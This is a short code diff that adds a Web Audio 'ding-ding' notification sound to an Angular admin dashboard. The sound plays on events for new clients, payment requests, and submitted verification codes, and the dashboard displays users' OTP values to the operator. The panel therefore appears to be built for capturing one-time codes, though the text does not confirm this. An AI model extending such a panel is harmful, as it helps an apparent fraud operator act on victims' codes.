@@ -145,6 +145,7 @@ export class Dashboard implements OnInit, OnDestroy {
             `عميل جديد انضم: ${newClient.phone_number}`,
             'success'
           );
+          this.playNotificationSound();
           break;
         }
 
@@ -158,6 +159,7 @@ export class Dashboard implements OnInit, OnDestroy {
             `طلب دفع جديد للعميل صاحب الرقم ${this.getClientPhone(payment.client_id)}`,
             'info'
           );
+          this.playNotificationSound();
           break;
         }
 
@@ -182,6 +184,7 @@ export class Dashboard implements OnInit, OnDestroy {
             `رمز تحقق جديد تم تقديمه: ${otp.otp}`,
             'info'
           );
+          this.playNotificationSound();
           break;
         }
 
@@ -247,5 +250,39 @@ export class Dashboard implements OnInit, OnDestroy {
     localStorage.removeItem('admin_token');
     localStorage.removeItem('admin_email');
     this.router.navigate(['/93ceb7962cf40688f3c465ba57ff7286893fd19e']);
+  }
+
+  // ── Audio Notification ────────────────────────────────────────────────
+  private playNotificationSound(): void {
+    try {
+      const AudioContextClass = window.AudioContext || (window as any).webkitAudioContext;
+      if (!AudioContextClass) return;
+      
+      const ctx = new AudioContextClass();
+      
+      const beep = (freq: number, timeOffset: number, duration: number) => {
+        const osc = ctx.createOscillator();
+        const gain = ctx.createGain();
+        
+        osc.type = 'sine';
+        osc.frequency.setValueAtTime(freq, ctx.currentTime + timeOffset);
+        
+        gain.gain.setValueAtTime(0, ctx.currentTime + timeOffset);
+        gain.gain.linearRampToValueAtTime(0.3, ctx.currentTime + timeOffset + 0.05);
+        gain.gain.linearRampToValueAtTime(0, ctx.currentTime + timeOffset + duration);
+        
+        osc.connect(gain);
+        gain.connect(ctx.destination);
+        
+        osc.start(ctx.currentTime + timeOffset);
+        osc.stop(ctx.currentTime + timeOffset + duration);
+      };
+
+      // Play a quick "Ding-Ding" sound
+      beep(880, 0, 0.15);       // A5
+      beep(1046.50, 0.15, 0.15); // C6
+    } catch (e) {
+      console.warn('Audio play failed:', e);
+    }
   }
 }
